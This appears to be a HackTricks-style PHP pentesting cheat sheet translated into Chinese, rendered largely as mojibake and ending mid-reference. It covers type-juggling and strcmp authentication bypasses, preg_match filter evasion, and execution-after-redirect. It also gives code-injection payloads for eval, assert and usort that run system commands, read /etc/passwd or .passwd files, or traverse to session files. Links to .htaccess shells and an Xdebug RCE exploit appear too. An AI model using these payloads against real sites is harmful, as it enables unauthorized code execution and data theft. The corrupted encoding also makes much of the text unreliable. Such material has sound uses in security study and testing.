# PHP æŠ€å·§

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š** å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Cookies å¸¸è§ä½ç½®ï¼š

è¿™ä¹Ÿé€‚ç”¨äº phpMyAdmin çš„ cookiesã€‚

Cookies:
```
PHPSESSID
phpMyAdmin
```
ä½ç½®ï¼š
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## ç»•è¿‡PHPæ¯”è¾ƒ

### å¼±æ¯”è¾ƒ/ç±»å‹è½¬æ¢ï¼ˆ==ï¼‰

å¦‚æœåœ¨PHPä¸­ä½¿ç”¨`==`ï¼Œåˆ™ä¼šå‡ºç°æ„å¤–æƒ…å†µï¼Œæ¯”è¾ƒçš„è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ã€‚è¿™æ˜¯å› ä¸º"=="åªæ¯”è¾ƒè½¬æ¢ä¸ºç›¸åŒç±»å‹çš„å€¼ï¼Œå¦‚æœæ‚¨è¿˜æƒ³æ¯”è¾ƒæ‰€æ¯”è¾ƒæ•°æ®çš„ç±»å‹æ˜¯å¦ç›¸åŒï¼Œæ‚¨éœ€è¦ä½¿ç”¨`===`ã€‚

PHPæ¯”è¾ƒè¡¨ï¼š[https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` ä»¥éæ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ç­‰äºæ•°å­—
* `"0xAAAA" == "43690" -> True` ç”±åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶æ ¼å¼ç»„æˆçš„å­—ç¬¦ä¸²å¯ä»¥ä¸å…¶ä»–æ•°å­—/å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ•°å­—ç›¸åŒï¼Œåˆ™ç»“æœä¸ºTrueï¼ˆå­—ç¬¦ä¸²ä¸­çš„æ•°å­—è¢«è§£é‡Šä¸ºæ•°å­—ï¼‰
* `"0e3264578" == 0 --> True` ä»¥"0e"å¼€å¤´å¹¶åè·Ÿä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº0
* `"0X3264578" == 0X --> True` ä»¥"0"å¼€å¤´å¹¶åè·Ÿä»»ä½•å­—æ¯ï¼ˆXå¯ä»¥æ˜¯ä»»ä½•å­—æ¯ï¼‰å’Œä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº0
* `"0e12334" == "0" --> True` è¿™éå¸¸æœ‰è¶£ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ§åˆ¶ä»¥"0"å¼€å¤´ä¸”æ²¡æœ‰ä»»ä½•å­—æ¯çš„å­—ç¬¦ä¸²è¾“å…¥ä»¥åŠæ­£åœ¨ä¸å…¶è¿›è¡Œæ¯”è¾ƒçš„æŸäº›å†…å®¹çš„å“ˆå¸Œã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å¯ä»¥æä¾›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼å°†åˆ›å»ºä»¥"0e"å¼€å¤´ä¸”æ²¡æœ‰ä»»ä½•å­—æ¯çš„å“ˆå¸Œï¼Œæ‚¨å¯ä»¥ç»•è¿‡æ¯”è¾ƒã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å…·æœ‰æ­¤æ ¼å¼çš„**å·²å“ˆå¸Œå­—ç¬¦ä¸²**ï¼š[https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å­—æ¯éƒ½ç­‰äºæ•´æ•°0

æ›´å¤šä¿¡æ¯è¯·å‚è§[https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**ç±»å‹è½¬æ¢**ä¹Ÿä¼šå½±å“åˆ°`in_array()`å‡½æ•°çš„é»˜è®¤è¡Œä¸ºï¼ˆæ‚¨éœ€è¦å°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸ºtrueä»¥è¿›è¡Œä¸¥æ ¼æ¯”è¾ƒï¼‰ï¼š
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

å¦‚æœè¿™ä¸ªå‡½æ•°ç”¨äº**ä»»ä½•èº«ä»½éªŒè¯æ£€æŸ¥**ï¼ˆæ¯”å¦‚æ£€æŸ¥å¯†ç ï¼‰ï¼Œå¹¶ä¸”ç”¨æˆ·æ§åˆ¶æ¯”è¾ƒçš„ä¸€æ–¹ï¼Œä»–å¯ä»¥å‘é€ä¸€ä¸ªç©ºæ•°ç»„ä½œä¸ºå¯†ç çš„å€¼ï¼ˆ`https://example.com/login.php/?username=admin&password[]=`ï¼‰ï¼Œä»è€Œç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼š
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()`ä¹Ÿä¼šå‡ºç°ç›¸åŒçš„é”™è¯¯ã€‚

### ä¸¥æ ¼ç±»å‹è½¬æ¢

å³ä½¿ä½¿ç”¨äº†`===`ï¼Œä»ç„¶å¯èƒ½å‡ºç°é”™è¯¯ï¼Œä½¿å¾—æ¯”è¾ƒå®¹æ˜“å—åˆ°ç±»å‹è½¬æ¢çš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¯”è¾ƒåœ¨æ¯”è¾ƒä¹‹å‰å°†æ•°æ®è½¬æ¢ä¸ºä¸åŒç±»å‹çš„å¯¹è±¡ï¼š
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`**å¯ä»¥ç”¨æ¥**éªŒè¯ç”¨æˆ·è¾“å…¥**ï¼ˆå®ƒä¼š**æ£€æŸ¥**ç”¨æˆ·è¾“å…¥ä¸­æ˜¯å¦å­˜åœ¨é»‘åå•ä¸­çš„ä»»ä½•**å•è¯/æ­£åˆ™è¡¨è¾¾å¼**ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œä»£ç å¯ä»¥ç»§ç»­æ‰§è¡Œï¼‰ã€‚

#### æ¢è¡Œç»•è¿‡

ç„¶è€Œï¼Œå½“å®šç•Œæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´æ—¶ï¼Œ`preg_match()`**åªä¼šæ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„ç¬¬ä¸€è¡Œ**ï¼Œæ‰€ä»¥å¦‚æœä½ å¯ä»¥ä»¥**å¤šè¡Œ**çš„æ–¹å¼**å‘é€**è¾“å…¥ï¼Œä½ å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ã€‚ä¾‹å¦‚ï¼š
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
ä¸ºäº†ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼Œä½ å¯ä»¥ä½¿ç”¨**æ¢è¡Œç¬¦è¿›è¡ŒURLç¼–ç **ï¼ˆ`%0A`ï¼‰å‘é€å€¼ï¼Œæˆ–è€…å¦‚æœä½ å¯ä»¥å‘é€**JSONæ•°æ®**ï¼Œå¯ä»¥å°†å…¶åˆ†æˆ**å¤šè¡Œ**å‘é€ï¼š
```php
{
"cmd": "cat /etc/passwd"
}
```
åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­ï¼š[https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **é•¿åº¦é”™è¯¯ç»•è¿‡**

ï¼ˆè¿™ä¸ªç»•è¿‡ä¼¼ä¹æ˜¯åœ¨ PHP 5.2.5 ä¸Šå°è¯•è¿‡çš„ï¼Œæˆ‘æ— æ³•åœ¨ PHP 7.3.15 ä¸Šä½¿å…¶å·¥ä½œï¼‰\
å¦‚æœä½ èƒ½å‘ `preg_match()` å‘é€ä¸€ä¸ªæœ‰æ•ˆçš„éå¸¸**å¤§çš„è¾“å…¥**ï¼Œå®ƒå°†**æ— æ³•å¤„ç†**å®ƒï¼Œä»è€Œä½¿ä½ èƒ½å¤Ÿ**ç»•è¿‡**æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®ƒåœ¨é»‘åå•ä¸­åˆ—å‡ºäº†ä¸€ä¸ª JSONï¼Œä½ å¯ä»¥å‘é€ï¼š
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
### PHPæ··æ·†çš„ç±»å‹è½¬æ¢

Type juggling is a technique used in PHP to obfuscate code and make it harder to understand. It involves manipulating the data types of variables in order to perform unexpected operations.

ç±»å‹è½¬æ¢æ˜¯PHPä¸­ä¸€ç§ç”¨äºæ··æ·†ä»£ç å¹¶å¢åŠ ç†è§£éš¾åº¦çš„æŠ€æœ¯ã€‚å®ƒæ¶‰åŠæ“ä½œå˜é‡çš„æ•°æ®ç±»å‹ï¼Œä»¥æ‰§è¡Œæ„å¤–çš„æ“ä½œã€‚

In PHP, variables do not have a fixed data type and can be dynamically changed based on the context in which they are used. This flexibility can be exploited to perform type juggling attacks.

åœ¨PHPä¸­ï¼Œå˜é‡æ²¡æœ‰å›ºå®šçš„æ•°æ®ç±»å‹ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®ä½¿ç”¨çš„ä¸Šä¸‹æ–‡åŠ¨æ€æ›´æ”¹ã€‚è¿™ç§çµæ´»æ€§å¯ä»¥è¢«åˆ©ç”¨æ¥æ‰§è¡Œç±»å‹è½¬æ¢æ”»å‡»ã€‚

Type juggling attacks involve manipulating the data types of variables in order to bypass input validation checks or perform unexpected operations. For example, a string that starts with a numeric value can be automatically converted to a number when used in a mathematical operation.

ç±»å‹è½¬æ¢æ”»å‡»æ¶‰åŠæ“ä½œå˜é‡çš„æ•°æ®ç±»å‹ï¼Œä»¥ç»•è¿‡è¾“å…¥éªŒè¯æ£€æŸ¥æˆ–æ‰§è¡Œæ„å¤–æ“ä½œã€‚ä¾‹å¦‚ï¼Œå½“åœ¨æ•°å­¦è¿ç®—ä¸­ä½¿ç”¨ä»¥æ•°å­—å€¼å¼€å¤´çš„å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è½¬æ¢ä¸ºæ•°å­—ã€‚

This can be used to bypass input validation checks that expect a specific data type. For example, if a web application expects a numeric input, an attacker can provide a string that starts with a number to bypass the validation check.

è¿™å¯ä»¥ç”¨äºç»•è¿‡æœŸæœ›ç‰¹å®šæ•°æ®ç±»å‹çš„è¾“å…¥éªŒè¯æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœWebåº”ç”¨ç¨‹åºæœŸæœ›æ•°å­—è¾“å…¥ï¼Œæ”»å‡»è€…å¯ä»¥æä¾›ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ä»¥ç»•è¿‡éªŒè¯æ£€æŸ¥ã€‚

Type juggling attacks can also be used to perform unexpected operations. For example, by manipulating the data types of variables, an attacker can concatenate a string with a numeric value, resulting in unintended behavior.

ç±»å‹è½¬æ¢æ”»å‡»è¿˜å¯ä»¥ç”¨äºæ‰§è¡Œæ„å¤–æ“ä½œã€‚ä¾‹å¦‚ï¼Œé€šè¿‡æ“ä½œå˜é‡çš„æ•°æ®ç±»å‹ï¼Œæ”»å‡»è€…å¯ä»¥å°†å­—ç¬¦ä¸²ä¸æ•°å­—å€¼è¿æ¥èµ·æ¥ï¼Œå¯¼è‡´æ„å¤–è¡Œä¸ºã€‚

To protect against type juggling attacks, it is important to ensure that input validation checks are performed correctly and that the expected data types are enforced.

ä¸ºäº†é˜²æ­¢ç±»å‹è½¬æ¢æ”»å‡»ï¼Œé‡è¦çš„æ˜¯ç¡®ä¿æ­£ç¡®æ‰§è¡Œè¾“å…¥éªŒè¯æ£€æŸ¥å¹¶å¼ºåˆ¶æ‰§è¡Œé¢„æœŸçš„æ•°æ®ç±»å‹ã€‚
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## æ‰§è¡Œé‡å®šå‘å (EAR)

å¦‚æœ PHP æ­£åœ¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œä½†åœ¨è®¾ç½®äº†å¤´éƒ¨çš„ `Location` åæ²¡æœ‰è°ƒç”¨ **`die`** æˆ– **`exit`** å‡½æ•°ï¼ŒPHP å°†ç»§ç»­æ‰§è¡Œå¹¶å°†æ•°æ®é™„åŠ åˆ°æ­£æ–‡ä¸­ï¼š
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## æ›´å¤šæŠ€å·§

* **register\_globals**: åœ¨ **PHP < 4.1.1.1** ç‰ˆæœ¬ä¸­ï¼Œæˆ–è€…é…ç½®é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯ç”¨ **register\_globals**ï¼ˆæˆ–è€…å…¶è¡Œä¸ºè¢«æ¨¡ä»¿ï¼‰ã€‚è¿™æ„å‘³ç€åœ¨å…¨å±€å˜é‡ä¸­ï¼Œæ¯”å¦‚ $\_GETï¼Œå¦‚æœå®ƒä»¬æœ‰ä¸€ä¸ªå€¼ï¼Œæ¯”å¦‚ $\_GET\["param"]="1234"ï¼Œä½ å¯ä»¥é€šè¿‡ **$param è®¿é—®å®ƒã€‚å› æ­¤ï¼Œé€šè¿‡å‘é€ HTTP å‚æ•°ï¼Œä½ å¯ä»¥è¦†ç›–åœ¨ä»£ç ä¸­ä½¿ç”¨çš„å˜é‡**ã€‚
* **åŒä¸€åŸŸåä¸‹çš„ PHPSESSION cookies å­˜å‚¨åœ¨åŒä¸€ä¸ªä½ç½®**ï¼Œå› æ­¤å¦‚æœåœ¨ä¸€ä¸ªåŸŸåä¸‹çš„ **ä¸åŒè·¯å¾„ä½¿ç”¨ä¸åŒçš„ cookies**ï¼Œä½ å¯ä»¥ä½¿ä¸€ä¸ªè·¯å¾„ **è®¿é—®å¦ä¸€ä¸ªè·¯å¾„çš„ cookie**ï¼Œè®¾ç½®å¦ä¸€ä¸ªè·¯å¾„ cookie çš„å€¼ã€‚\
è¿™æ ·ï¼Œå¦‚æœ **ä¸¤ä¸ªè·¯å¾„éƒ½è®¿é—®åŒåçš„å˜é‡**ï¼Œä½ å¯ä»¥ä½¿è¯¥å˜é‡åœ¨è·¯å¾„1ä¸­çš„å€¼åº”ç”¨åˆ°è·¯å¾„2ä¸­ã€‚ç„¶åè·¯å¾„2å°†æ¥å—è·¯å¾„1çš„å˜é‡ä¸ºæœ‰æ•ˆï¼ˆé€šè¿‡ç»™ cookie èµ‹äºˆåœ¨è·¯å¾„2ä¸­å¯¹åº”çš„åç§°ï¼‰ã€‚
* å½“ä½ æ‹¥æœ‰æœºå™¨ä¸Šç”¨æˆ·çš„ **ç”¨æˆ·å** æ—¶ï¼Œæ£€æŸ¥åœ°å€ï¼š**/\~\<USERNAME>**ï¼Œçœ‹çœ‹æ˜¯å¦æ¿€æ´»äº† php ç›®å½•ã€‚
* [**ä½¿ç”¨ php åŒ…è£…å™¨è¿›è¡Œ LFI å’Œ RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

è¿™äº›å‡½æ•°é€šå¸¸ç”¨äº PHP ä¸­ä»å¯†ç ç”Ÿæˆå“ˆå¸Œå€¼ï¼Œå¹¶ä¸”ç”¨äºä¸å“ˆå¸Œå€¼æ¯”è¾ƒä»¥æ£€æŸ¥å¯†ç æ˜¯å¦æ­£ç¡®ã€‚\
æ”¯æŒçš„ç®—æ³•æœ‰ï¼š`PASSWORD_DEFAULT` å’Œ `PASSWORD_BCRYPT`ï¼ˆä»¥ `$2y$` å¼€å¤´ï¼‰ã€‚è¯·æ³¨æ„ï¼Œ**PASSWORD\_DEFAULT ç»å¸¸ä¸ PASSWORD\_BCRYPT ç›¸åŒ**ã€‚ç›®å‰ï¼Œ**PASSWORD\_BCRYPT** å¯¹è¾“å…¥çš„å¤§å°æœ‰ä¸€ä¸ªé™åˆ¶ï¼Œæœ€å¤šä¸º 72 å­—èŠ‚ã€‚å› æ­¤ï¼Œå½“ä½ å°è¯•ä½¿ç”¨æ­¤ç®—æ³•å¯¹å¤§äº 72 å­—èŠ‚çš„å†…å®¹è¿›è¡Œå“ˆå¸Œæ—¶ï¼Œåªæœ‰å‰ 72 å­—èŠ‚ä¼šè¢«ä½¿ç”¨ï¼š
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTPå¤´ç»•è¿‡æ»¥ç”¨PHPé”™è¯¯

å¦‚æœä¸€ä¸ªPHPé¡µé¢æ­£åœ¨æ‰“å°é”™è¯¯å¹¶å›æ˜¾ç”¨æˆ·æä¾›çš„ä¸€äº›è¾“å…¥ï¼Œç”¨æˆ·å¯ä»¥ä½¿PHPæœåŠ¡å™¨æ‰“å°å›ä¸€äº›è¶³å¤Ÿé•¿çš„å†…å®¹ï¼Œä»¥ä¾¿å½“å®ƒå°è¯•å°†å¤´éƒ¨æ·»åŠ åˆ°å“åº”æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠ›å‡ºé”™è¯¯ã€‚\
åœ¨ä¸‹é¢çš„åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…ä½¿æœåŠ¡å™¨æŠ›å‡ºäº†ä¸€äº›å¤§é”™è¯¯ï¼Œæ­£å¦‚ä½ åœ¨å±å¹•ä¸Šçœ‹åˆ°çš„ï¼Œå½“PHPå°è¯•ä¿®æ”¹å¤´éƒ¨ä¿¡æ¯æ—¶ï¼Œå®ƒæ— æ³•åšåˆ°ï¼ˆä¾‹å¦‚CSPå¤´éƒ¨æœªå‘é€ç»™ç”¨æˆ·ï¼‰ï¼š

![](<../../../.gitbook/assets/image (465).png>)

## ä»£ç æ‰§è¡Œ

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[æŸ¥çœ‹æ›´å¤šæœ‰ç”¨çš„PHPå‡½æ•°](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
åœ¨"replace"å‚æ•°ä¸­æ‰§è¡Œä»£ç éœ€è¦è‡³å°‘ä¸€ä¸ªåŒ¹é…é¡¹ã€‚\
è¿™ä¸ªpreg_replaceé€‰é¡¹å·²ç»åœ¨PHP 5.5.0ä¸­è¢«**å¼ƒç”¨**ã€‚

### **ä½¿ç”¨Eval()æ‰§è¡Œä»£ç **
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **ä½¿ç”¨Assert()æ‰§è¡Œä»£ç **

è¿™ä¸ªphpå‡½æ•°å…è®¸ä½ æ‰§è¡Œä»¥å­—ç¬¦ä¸²å½¢å¼ç¼–å†™çš„ä»£ç ï¼Œä»¥è¿”å›trueæˆ–falseï¼ˆå¹¶æ ¹æ®æ­¤æ¥æ”¹å˜æ‰§è¡Œæ–¹å¼ï¼‰ã€‚é€šå¸¸ï¼Œç”¨æˆ·å˜é‡ä¼šè¢«æ’å…¥åˆ°å­—ç¬¦ä¸²çš„ä¸­é—´ã€‚ä¾‹å¦‚ï¼š\
`assert("strpos($_GET['page']),'..') === false")` --> åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ºäº†è·å¾—**è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**ï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
æ‚¨éœ€è¦**ç ´å**ä»£ç **è¯­æ³•**ï¼Œ**æ·»åŠ **æ‚¨çš„**æœ‰æ•ˆè½½è·**ï¼Œç„¶åå†**ä¿®å¤**å®ƒã€‚æ‚¨å¯ä»¥ä½¿ç”¨**é€»è¾‘æ“ä½œ**ï¼Œä¾‹å¦‚"**and**"æˆ–"**%26%26**"æˆ–"**|**"ã€‚è¯·æ³¨æ„ï¼Œ"or"ã€"||"ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºå¦‚æœç¬¬ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·å°†ä¸ä¼šè¢«æ‰§è¡Œã€‚åŒæ ·ï¼Œ";"ä¹Ÿä¸èµ·ä½œç”¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ä¸ä¼šè¢«æ‰§è¡Œã€‚

**å¦ä¸€ç§é€‰æ‹©**æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æ·»åŠ å‘½ä»¤çš„æ‰§è¡Œï¼š`'.highlight_file('.passwd').'`

**å¦ä¸€ç§é€‰æ‹©**ï¼ˆå¦‚æœæ‚¨æœ‰å†…éƒ¨ä»£ç ï¼‰æ˜¯ä¿®æ”¹æŸäº›å˜é‡ä»¥æ›´æ”¹æ‰§è¡Œæ–¹å¼ï¼š`$file = "hola"`

### **ä½¿ç”¨usort()æ‰§è¡Œä»£ç **

æ­¤å‡½æ•°ç”¨äºä½¿ç”¨ç‰¹å®šå‡½æ•°å¯¹é¡¹ç›®æ•°ç»„è¿›è¡Œæ’åºã€‚\
è¦æ»¥ç”¨æ­¤å‡½æ•°ï¼š
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**//**æ¥æ³¨é‡Šä»£ç çš„å…¶ä½™éƒ¨åˆ†ã€‚

è¦å‘ç°æ‚¨éœ€è¦å…³é—­çš„æ‹¬å·æ•°ï¼š

* `?order=id;}//`ï¼šæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼ˆ`Parse error: syntax error, unexpected ';'`ï¼‰ã€‚æˆ‘ä»¬å¯èƒ½ç¼ºå°‘ä¸€ä¸ªæˆ–å¤šä¸ªæ‹¬å·ã€‚
* `?order=id);}//`ï¼šæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ª**è­¦å‘Š**ã€‚è¿™ä¼¼ä¹æ˜¯æ­£ç¡®çš„ã€‚
* `?order=id));}//`ï¼šæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼ˆ`Parse error: syntax error, unexpected ')' i`ï¼‰ã€‚æˆ‘ä»¬å¯èƒ½æœ‰å¤ªå¤šçš„é—­åˆæ‹¬å·ã€‚

### **é€šè¿‡.httaccessæ‰§è¡Œä»£ç **

å¦‚æœæ‚¨å¯ä»¥**ä¸Šä¼ **ä¸€ä¸ª**.htaccess**æ–‡ä»¶ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥**é…ç½®**å¤šä¸ªå†…å®¹ï¼Œç”šè‡³å¯ä»¥æ‰§è¡Œä»£ç ï¼ˆé…ç½®æ‰©å±•åä¸º.htaccessçš„æ–‡ä»¶å¯ä»¥**æ‰§è¡Œ**ï¼‰ã€‚

å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/wireghoul/htshells)æ‰¾åˆ°ä¸åŒçš„.htaccess shellã€‚

## PHPé™æ€åˆ†æ

æŸ¥çœ‹æ˜¯å¦å¯ä»¥åœ¨å¯¹è¿™äº›å‡½æ•°çš„è°ƒç”¨ä¸­æ’å…¥ä»£ç ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)ï¼‰ï¼š
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
å¦‚æœæ‚¨æ­£åœ¨è°ƒè¯•ä¸€ä¸ªPHPåº”ç”¨ç¨‹åºï¼Œæ‚¨å¯ä»¥åœ¨`/etc/php5/apache2/php.ini`ä¸­æ·»åŠ `display_errors = On`æ¥å…¨å±€å¯ç”¨é”™è¯¯æ‰“å°ï¼Œå¹¶é‡æ–°å¯åŠ¨apacheï¼š`sudo systemctl restart apache2`

### è§£å¯†PHPä»£ç 

æ‚¨å¯ä»¥ä½¿ç”¨[**www.unphp.net**](http://www.unphp.net)æ¥è§£å¯†PHPä»£ç ã€‚

## PHPåŒ…è£…å™¨å’Œåè®®

PHPåŒ…è£…å™¨å’Œåè®®å¯ä»¥è®©æ‚¨ç»•è¿‡ç³»ç»Ÿä¸­çš„å†™å…¥å’Œè¯»å–ä¿æŠ¤ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç ´åã€‚æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤é¡µé¢**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols)ã€‚

## Xdebugæœªç»èº«ä»½éªŒè¯çš„RCE

å¦‚æœæ‚¨åœ¨`phpconfig()`è¾“å‡ºä¸­çœ‹åˆ°**Xdebug**å·²å¯ç”¨ï¼Œæ‚¨åº”è¯¥å°è¯•é€šè¿‡[https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)è·å–RCEã€‚

## å˜é‡å˜é‡
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## æ»¥ç”¨æ–°çš„ $\_GET\["a"]\($\_GET\["b"]) å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ

å¦‚æœåœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œä½ å¯ä»¥**åˆ›å»ºä¸€ä¸ªä»»æ„ç±»çš„æ–°å¯¹è±¡**ï¼Œé‚£ä¹ˆä½ å¯èƒ½èƒ½å¤Ÿå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£è¯¦æƒ…ï¼š

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
